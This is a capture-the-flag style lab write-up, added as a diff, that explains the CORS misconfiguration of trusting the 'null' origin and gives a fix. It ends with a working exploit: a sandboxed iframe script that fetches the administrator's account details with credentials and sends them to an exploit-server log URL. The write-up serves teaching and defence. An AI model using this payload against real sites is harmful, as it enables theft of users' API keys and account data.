@@ -1,0 +1,62 @@
+// Lab: CORS vulnerability with trusted null origin
+
+This website has an insecure CORS configuration in that it trusts the "null" origin.
+
+To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.
+
+You can log in to your own account using the following credentials: wiener:peter
+
+
+
+// Solution
+
+
+// Whitelisted Null Origin Vulnerability
+What it is: Servers that trust Origin: null can be exploited by attackers to bypass CORS restrictions.
+
+// When browsers send Origin: null:
+
+1. Cross-origin redirects
+2. Requests from serialized data
+3. Requests using file: protocol
+4. Sandboxed cross-origin requests (<iframe sandbox>)
+
+
+// How the attack works:
+
+1. Server whitelists null origin (often for local dev purposes)
+
+2. Server responds with Access-Control-Allow-Origin: null + Access-Control-Allow-Credentials: true
+
+3. Attacker crafts a sandboxed <iframe> — which naturally sends Origin: null.
+
+4. Request passes the whitelist check.
+
+5. Attacker gains cross-domain access to sensitive data.
+
+
+The vulnerable response pattern:
+
+Access-Control-Allow-Origin: null
+Access-Control-Allow-Credentials: true
+
+Fix: Never whitelist null as a trusted origin in production — use explicit, validated origin values instead.
+
+
+// To solve the lab we Inject the following exploit in the exploit server:
+
+// Exploit
+
+<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
+    const req = new XMLHttpRequest();
+    req.onload = reqListener;
+    req.open('get','https://0af700a1035705c8802e0d9800c70019.web-security-academy.net/accountDetails',true);
+    req.withCredentials = true;
+    req.send();
+    function reqListener() {
+        location='https://exploit-0add00eb0371058680750c9b01460009.exploit-server.net/log?key='+encodeURIComponent(this.responseText);
+    };
+</script>"></iframe>
+
+
+// deliver this into victim machine and then click Accesslog and get API key and submit it to solve the lab.
